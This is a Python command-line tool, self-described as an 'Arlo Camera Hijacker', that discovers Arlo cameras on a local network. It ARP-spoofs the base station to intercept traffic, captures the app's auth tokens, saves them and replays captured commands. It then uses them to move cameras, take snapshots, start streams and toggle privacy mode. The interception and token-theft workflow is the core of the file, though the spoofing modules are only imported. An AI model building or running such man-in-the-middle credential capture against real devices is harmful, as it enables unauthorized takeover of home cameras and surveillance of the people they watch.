#!/usr/bin/env python3
"""
CamControl — Local Arlo Camera Hijacker & PTZ Controller

Discover, intercept, and directly control Arlo cameras on your LAN
without going through Arlo's cloud services.

Usage:
    python main.py discover                      # Find Arlo devices on the network
    python main.py intercept --base-ip <IP>      # MITM to capture auth & commands
    python main.py control --base-ip <IP>        # Interactive PTZ control
    python main.py replay <capture_file>         # Replay captured commands
    python main.py move --base-ip <IP> --dir left  # One-shot movement

Requires root/sudo for ARP spoofing and packet capture.
"""

import os
import sys
import signal
import time
import argparse
import logging
import json
import threading
from typing import Optional

import yaml

from discovery import (
    discover_arlo_devices, print_devices,
    ArloDevice, get_subnet
)
from interceptor import ARPInterceptor, CommandSniffer
from arlo_api import ArloLocalAPI, ArloCamera
from controller import CameraController, MovementConfig

logger = logging.getLogger("camcontrol")


def load_config(path: str = "config.yaml") -> dict:
    """Load configuration from YAML file."""
    default_config = {
        "network": {"interface": None, "subnet": None},
        "arlo": {
            "base_station_ip": None,
            "auth_token": None,
            "camera_serial": None,
        },
        "intercept": {
            "proxy_port": 8888,
            "capture_dir": "./captures",
            "auto_extract_token": True,
        },
        "control": {
            "move_speed": 0.5,
            "move_duration": 0.5,
            "step_interval": 0.1,
        },
    }

    if os.path.exists(path):
        with open(path) as f:
            user_config = yaml.safe_load(f) or {}

        def merge(base, override):
            for k, v in override.items():
                if k in base and isinstance(base[k], dict) and isinstance(v, dict):
                    merge(base[k], v)
                else:
                    base[k] = v

        merge(default_config, user_config)

    return default_config


def save_config(config: dict, path: str = "config.yaml"):
    """Save config back to YAML."""
    with open(path, "w") as f:
        yaml.dump(config, f, default_flow_style=False)


# === CLI Commands ===

def cmd_discover(args, config):
    """Discover Arlo devices on the network."""
    print("\n  CamControl — Arlo Device Discovery\n")

    base_stations, cameras = discover_arlo_devices(
        subnet=args.subnet or config["network"]["subnet"],
        interface=args.interface or config["network"]["interface"],
        base_station_ip=args.base_ip or config["arlo"]["base_station_ip"],
    )

    print_devices(base_stations, cameras)

    if args.save and base_stations:
        config["arlo"]["base_station_ip"] = base_stations[0].ip
        save_config(config, args.config)
        print(f"  Saved base station IP to {args.config}\n")


def cmd_intercept(args, config):
    """
    Intercept traffic between the Arlo app and base station.
    Captures auth tokens and PTZ command format.
    """
    base_ip = args.base_ip or config["arlo"]["base_station_ip"]
    if not base_ip:
        print("  Error: Base station IP required. Run 'discover' first or use --base-ip")
        sys.exit(1)

    interface = args.interface or config["network"]["interface"]
    capture_dir = config["intercept"]["capture_dir"]

    print("\n" + "=" * 60)
    print("  CamControl — Arlo Traffic Interceptor")
    print("=" * 60)
    print(f"  Base station: {base_ip}")
    print(f"  Interface:    {interface or 'auto'}")
    print(f"  Captures:     {capture_dir}")
    print()
    print("  HOW TO USE:")
    print("  1. This will ARP-spoof to intercept base station traffic")
    print("  2. Open the Arlo app on your phone (same network)")
    print("  3. Move the camera using the app's PTZ controls")
    print("  4. We capture the commands and auth tokens")
    print("  5. Press Ctrl+C when done — tokens are saved for control mode")
    print("=" * 60)
    print()

    # Start ARP interception
    interceptor = ARPInterceptor(
        base_station_ip=base_ip,
        interface=interface,
    )

    # Start command sniffer
    def on_command(cmd):
        label = "PTZ" if cmd.is_ptz else "AUTH" if cmd.is_auth else "CMD"
        body_preview = ""
        if cmd.body:
            body_preview = f" | {json.dumps(cmd.body)[:80]}"
        print(f"  [{label}] {cmd.method} {cmd.path}{body_preview}")

    sniffer = CommandSniffer(
        base_station_ip=base_ip,
        interface=interface,
        capture_dir=capture_dir,
        on_command=on_command,
    )

    def shutdown(sig=None, frame=None):
        print("\n  Stopping intercept...")
        sniffer.stop()
        interceptor.stop()

        # Save captures
        if sniffer.commands:
            path = sniffer.save_captures()
            print(f"  Saved {len(sniffer.commands)} commands to {path}")

        # Save auth token to config
        token = sniffer.get_latest_token()
        if token:
            config["arlo"]["auth_token"] = token
            save_config(config, args.config)
            print(f"  Auth token saved to {args.config}")
            print(f"  You can now use: python main.py control --base-ip {base_ip}")

        # Stats
        print(f"\n  Stats: {sniffer.stats}")
        if sniffer.ptz_commands:
            print(f"\n  PTZ Commands Captured:")
            for cmd in sniffer.ptz_commands:
                print(f"    {cmd.method} {cmd.path}")
                if cmd.body:
                    print(f"      {json.dumps(cmd.body, indent=6)}")
        print()

        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)

    interceptor.start()
    time.sleep(1)
    sniffer.start()

    print("  Listening for Arlo traffic... (Ctrl+C to stop)\n")

    # Status loop
    while True:
        time.sleep(5)
        stats = sniffer.stats
        print(
            f"  [{time.strftime('%H:%M:%S')}] "
            f"cmds={stats['total_commands']} "
            f"ptz={stats['ptz_commands']} "
            f"tokens={stats['auth_tokens']} "
            f"streams={stats['active_streams']}"
        )


def cmd_control(args, config):
    """Interactive PTZ control mode."""
    base_ip = args.base_ip or config["arlo"]["base_station_ip"]
    if not base_ip:
        print("  Error: Base station IP required. Run 'discover' first or use --base-ip")
        sys.exit(1)

    auth_token = args.token or config["arlo"]["auth_token"]

    print("\n" + "=" * 60)
    print("  CamControl — Interactive Camera Control")
    print("=" * 60)

    # Connect to base station
    api = ArloLocalAPI(
        base_station_ip=base_ip,
        auth_token=auth_token,
    )

    if not api.connect():
        print("  Warning: Could not fully connect. Some features may not work.")
        print("  Try running 'intercept' first to capture an auth token.\n")

    # Select camera
    camera_id = args.camera or config["arlo"]["camera_serial"]

    if not camera_id and api.cameras:
        ptz_cameras = {k: v for k, v in api.cameras.items() if v.has_ptz}
        if ptz_cameras:
            print(f"\n  PTZ-capable cameras:")
            for i, (cid, cam) in enumerate(ptz_cameras.items()):
                print(f"    [{i}] {cam}")
            if len(ptz_cameras) == 1:
                camera_id = list(ptz_cameras.keys())[0]
                print(f"\n  Auto-selected: {ptz_cameras[camera_id]}")
            else:
                try:
                    choice = input("\n  Select camera [0]: ").strip()
                    idx = int(choice) if choice else 0
                    camera_id = list(ptz_cameras.keys())[idx]
                except (ValueError, IndexError):
                    camera_id = list(ptz_cameras.keys())[0]
        elif api.cameras:
            camera_id = list(api.cameras.keys())[0]
            print(f"\n  Using camera: {api.cameras[camera_id]}")
            print("  Note: PTZ capability not confirmed. Commands may not work.")

    if not camera_id:
        print("\n  No cameras found. Entering manual mode.")
        camera_id = input("  Enter camera device ID: ").strip()
        if not camera_id:
            print("  Error: Camera ID required.")
            sys.exit(1)

    # Create controller
    ccfg = config["control"]
    move_config = MovementConfig(
        speed=ccfg["move_speed"],
        duration=ccfg["move_duration"],
        step_interval=ccfg["step_interval"],
    )

    ctrl = CameraController(api, camera_id, move_config)

    # Start event stream for async responses
    api.start_event_stream()

    print(f"\n  Camera: {camera_id}")
    print(f"  Speed:  {move_config.speed}")
    print()
    _run_interactive(ctrl, api)


def _run_interactive(ctrl: CameraController, api: ArloLocalAPI):
    """Interactive control loop with keyboard commands."""
    print("  === Controls ===")
    print("  Movement:    w/a/s/d or up/down/left/right")
    print("  Zoom:        +/- or z/x")
    print("  Home:        h")
    print("  Stop:        space or 0")
    print("  Speed:       1-9 (0.1 - 0.9)")
    print("  Presets:     p1-p9 (goto), P1-P9 (save)")
    print("  Patterns:    sweep, vsweep, grid, patrol")
    print("  Camera:      snap, stream, night, privacy")
    print("  Position:    pos (show current position)")
    print("  Look at:     goto <pan> <tilt> [zoom]")
    print("  Raw:         raw <action> <resource> <json_properties>")
    print("  Quit:        q")
    print("  " + "-" * 40)
    print()

    while True:
        try:
            cmd = input("  cam> ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            break

        if not cmd:
            continue

        # Quit
        if cmd in ("q", "quit", "exit"):
            break

        # Movement
        elif cmd in ("w", "up"):
            ctrl.up()
        elif cmd in ("s", "down"):
            ctrl.down()
        elif cmd in ("a", "left"):
            ctrl.left()
        elif cmd in ("d", "right"):
            ctrl.right()
        elif cmd in ("+", "z", "zi", "zoomin"):
            ctrl.zoom_in()
        elif cmd in ("-", "x", "zo", "zoomout"):
            ctrl.zoom_out()

        # Diagonal
        elif cmd in ("wa", "upleft"):
            ctrl.api.move(ctrl.camera_id, pan=-ctrl.config.step_size,
                         tilt=ctrl.config.step_size, speed=ctrl.config.speed)
        elif cmd in ("wd", "upright"):
            ctrl.api.move(ctrl.camera_id, pan=ctrl.config.step_size,
                         tilt=ctrl.config.step_size, speed=ctrl.config.speed)
        elif cmd in ("sa", "downleft"):
            ctrl.api.move(ctrl.camera_id, pan=-ctrl.config.step_size,
                         tilt=-ctrl.config.step_size, speed=ctrl.config.speed)
        elif cmd in ("sd", "downright"):
            ctrl.api.move(ctrl.camera_id, pan=ctrl.config.step_size,
                         tilt=-ctrl.config.step_size, speed=ctrl.config.speed)

        # Stop / Home
        elif cmd in ("0", " ", "stop"):
            ctrl.stop()
            print("  Stopped.")
        elif cmd in ("h", "home"):
            ctrl.home()
            print("  Returning home.")

        # Speed
        elif cmd in [str(i) for i in range(1, 10)]:
            ctrl.config.speed = int(cmd) / 10.0
            print(f"  Speed: {ctrl.config.speed}")

        # Presets
        elif cmd.startswith("p") and len(cmd) == 2 and cmd[1].isdigit():
            preset_id = int(cmd[1])
            ctrl.goto_preset(preset_id)
            print(f"  Going to preset {preset_id}")
        elif cmd.startswith("P") and len(cmd) == 2 and cmd[1].isdigit():
            preset_id = int(cmd[1])
            name = input(f"  Preset {preset_id} name: ").strip()
            ctrl.save_preset(preset_id, name)
            print(f"  Saved preset {preset_id}")

        # Patterns
        elif cmd == "sweep":
            print("  Horizontal sweep...")
            ctrl.sweep_horizontal()
            print("  Done.")
        elif cmd == "vsweep":
            print("  Vertical sweep...")
            ctrl.sweep_vertical()
            print("  Done.")
        elif cmd == "grid":
            print("  Grid scan (this takes a while)...")
            ctrl.grid_scan()
            print("  Done.")
        elif cmd == "patrol":
            ctrl.patrol()
            print("  Patrol started. Type 'stop' to end.")

        # Continuous movement
        elif cmd.startswith("hold "):
            direction = cmd.split()[1]
            ctrl.start_continuous(direction)
            print(f"  Holding {direction}... type 'stop' to end")

        # Position
        elif cmd == "pos":
            pos = ctrl.refresh_position()
            if pos:
                print(f"  Position: {pos}")
            else:
                print(f"  Position (estimated): {ctrl.position}")

        # Absolute move
        elif cmd.startswith("goto "):
            parts = cmd.split()
            try:
                pan = float(parts[1])
                tilt = float(parts[2])
                zoom = float(parts[3]) if len(parts) > 3 else 0.0
                ctrl.look_at(pan, tilt, zoom)
                print(f"  Moving to pan={pan} tilt={tilt} zoom={zoom}")
            except (IndexError, ValueError):
                print("  Usage: goto <pan> <tilt> [zoom]")

        # Camera functions
        elif cmd == "snap":
            url = api.trigger_snapshot(ctrl.camera_id)
            print(f"  Snapshot: {url or 'triggered (no URL returned)'}")
        elif cmd == "stream":
            url = api.start_stream(ctrl.camera_id)
            print(f"  Stream: {url or 'started (no URL returned)'}")
        elif cmd == "night":
            api.toggle_night_vision(ctrl.camera_id, True)
            print("  Night vision ON")
        elif cmd == "nightoff":
            api.toggle_night_vision(ctrl.camera_id, False)
            print("  Night vision OFF")
        elif cmd == "privacy":
            api.toggle_privacy_mode(ctrl.camera_id, True)
            print("  Privacy mode ON (camera disabled)")
        elif cmd == "privacyoff":
            api.toggle_privacy_mode(ctrl.camera_id, False)
            print("  Privacy mode OFF (camera active)")

        # Raw command
        elif cmd.startswith("raw "):
            parts = cmd.split(maxsplit=3)
            if len(parts) < 4:
                print("  Usage: raw <action> <resource> <json_properties>")
                continue
            try:
                props = json.loads(parts[3])
                result = api.send_raw(ctrl.camera_id, parts[1], parts[2], props)
                print(f"  Result: {json.dumps(result, indent=2) if result else 'no response'}")
            except json.JSONDecodeError:
                print("  Error: Invalid JSON properties")

        # Status
        elif cmd in ("status", "info"):
            for k, v in ctrl.status.items():
                print(f"  {k}: {v}")

        else:
            print(f"  Unknown command: {cmd}")
            print("  Type 'q' to quit, 'h' for home, w/a/s/d to move")

    # Cleanup
    print("\n  Disconnecting...")
    ctrl.stop()
    api.close()
    print("  Done.\n")


def cmd_move(args, config):
    """One-shot movement command."""
    base_ip = args.base_ip or config["arlo"]["base_station_ip"]
    if not base_ip:
        print("  Error: Base station IP required.")
        sys.exit(1)

    auth_token = args.token or config["arlo"]["auth_token"]
    camera_id = args.camera or config["arlo"]["camera_serial"]

    api = ArloLocalAPI(base_station_ip=base_ip, auth_token=auth_token)
    api.connect()

    if not camera_id and api.cameras:
        ptz_cameras = [k for k, v in api.cameras.items() if v.has_ptz]
        camera_id = ptz_cameras[0] if ptz_cameras else list(api.cameras.keys())[0]

    if not camera_id:
        print("  Error: No camera found. Use --camera to specify.")
        sys.exit(1)

    ccfg = config["control"]
    ctrl = CameraController(
        api, camera_id,
        MovementConfig(speed=ccfg["move_speed"], duration=ccfg["move_duration"]),
    )

    direction = args.dir
    amount = args.amount

    moves = {
        "left": ctrl.left, "right": ctrl.right,
        "up": ctrl.up, "down": ctrl.down,
        "zoomin": ctrl.zoom_in, "zoomout": ctrl.zoom_out,
        "home": lambda **kw: ctrl.home(),
    }

    if direction in moves:
        if amount:
            moves[direction](amount=amount)
        else:
            moves[direction]()
        print(f"  Moved: {direction}" + (f" ({amount})" if amount else ""))
    else:
        print(f"  Unknown direction: {direction}")
        print(f"  Options: {', '.join(moves.keys())}")

    api.close()


def cmd_replay(args, config):
    """Replay captured commands from a JSON capture file."""
    if not os.path.exists(args.capture_file):
        print(f"  Error: File not found: {args.capture_file}")
        sys.exit(1)

    with open(args.capture_file) as f:
        data = json.load(f)

    base_ip = data.get("base_station_ip") or args.base_ip or config["arlo"]["base_station_ip"]
    if not base_ip:
        print("  Error: Base station IP not in capture file. Use --base-ip")
        sys.exit(1)

    auth_token = None
    tokens = data.get("auth_tokens", [])
    if tokens:
        auth_token = tokens[-1]
        print(f"  Using captured auth token: {auth_token[:20]}...")
    elif config["arlo"]["auth_token"]:
        auth_token = config["arlo"]["auth_token"]

    api = ArloLocalAPI(base_station_ip=base_ip, auth_token=auth_token)
    api.connect()

    commands = data.get("ptz_commands", []) if args.ptz_only else data.get("all_commands", [])

    print(f"\n  Replaying {len(commands)} commands...")
    print(f"  Base station: {base_ip}")
    print(f"  Delay between commands: {args.delay}s\n")

    for i, cmd in enumerate(commands):
        print(f"  [{i+1}/{len(commands)}] {cmd['method']} {cmd['path']}")
        result = api.replay_command(cmd)
        if result:
            print(f"    -> {json.dumps(result)[:100]}")
        time.sleep(args.delay)

    print(f"\n  Replay complete.\n")
    api.close()


def main():
    parser = argparse.ArgumentParser(
        description="CamControl — Local Arlo Camera Hijacker & PTZ Controller",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("-c", "--config", default="config.yaml",
                        help="Config file path")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Debug logging")
    parser.add_argument("-i", "--interface", default=None,
                        help="Network interface")

    subparsers = parser.add_subparsers(dest="command", help="Command")

    # discover
    p_disc = subparsers.add_parser("discover", help="Find Arlo devices")
    p_disc.add_argument("--subnet", help="Subnet to scan")
    p_disc.add_argument("--base-ip", help="Known base station IP")
    p_disc.add_argument("--save", action="store_true",
                        help="Save results to config")

    # intercept
    p_int = subparsers.add_parser("intercept",
                                   help="MITM to capture commands & tokens")
    p_int.add_argument("--base-ip", help="Base station IP", required=False)

    # control
    p_ctrl = subparsers.add_parser("control", help="Interactive PTZ control")
    p_ctrl.add_argument("--base-ip", help="Base station IP")
    p_ctrl.add_argument("--token", help="Auth token")
    p_ctrl.add_argument("--camera", help="Camera device ID")

    # move (one-shot)
    p_move = subparsers.add_parser("move", help="One-shot camera movement")
    p_move.add_argument("--base-ip", help="Base station IP")
    p_move.add_argument("--token", help="Auth token")
    p_move.add_argument("--camera", help="Camera device ID")
    p_move.add_argument("--dir", required=True,
                        choices=["left", "right", "up", "down",
                                 "zoomin", "zoomout", "home"],
                        help="Direction to move")
    p_move.add_argument("--amount", type=float, default=None,
                        help="Movement amount (0.0-1.0)")

    # replay
    p_replay = subparsers.add_parser("replay", help="Replay captured commands")
    p_replay.add_argument("capture_file", help="Path to capture JSON file")
    p_replay.add_argument("--base-ip", help="Override base station IP")
    p_replay.add_argument("--delay", type=float, default=0.5,
                          help="Delay between commands (seconds)")
    p_replay.add_argument("--ptz-only", action="store_true",
                          help="Only replay PTZ commands")

    args = parser.parse_args()

    # Logging
    level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=level,
        format="%(asctime)s [%(name)s] %(levelname)s: %(message)s",
        datefmt="%H:%M:%S",
    )

    config = load_config(args.config)

    if args.interface:
        config["network"]["interface"] = args.interface

    if not args.command:
        parser.print_help()
        sys.exit(1)

    commands = {
        "discover": cmd_discover,
        "intercept": cmd_intercept,
        "control": cmd_control,
        "move": cmd_move,
        "replay": cmd_replay,
    }

    cmd_func = commands.get(args.command)
    if cmd_func:
        cmd_func(args, config)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
